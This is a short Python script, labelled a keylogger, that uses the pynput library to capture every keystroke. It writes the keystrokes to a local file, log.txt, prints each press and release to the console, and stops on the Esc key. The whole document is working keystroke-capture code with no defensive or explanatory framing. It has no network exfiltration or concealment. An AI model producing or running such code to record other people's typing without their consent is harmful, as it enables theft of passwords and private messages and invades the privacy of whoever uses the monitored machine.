# keylogger using pynput module
import pynput
from pynput.keyboard import Key, Listener
keys = []


def on_press(Key):
    keys.append(Key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(Key.char))

    except AttributeError:
        print('special key {0} pressed'.format(Key))


def write_file(Keys):
    with open('log.txt','w') as f:
        for key in Keys:
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)


            # every keystroke for readability
            f.write(' ')

def on_release(key):
    print('{0} released'.format(key))
    if key == pynput.keyboard.Key.esc:
        # Stop listener
        return False


with pynput.keyboard.Listener(on_press=on_press,
                              on_release=on_release) as listener:
    listener.join()
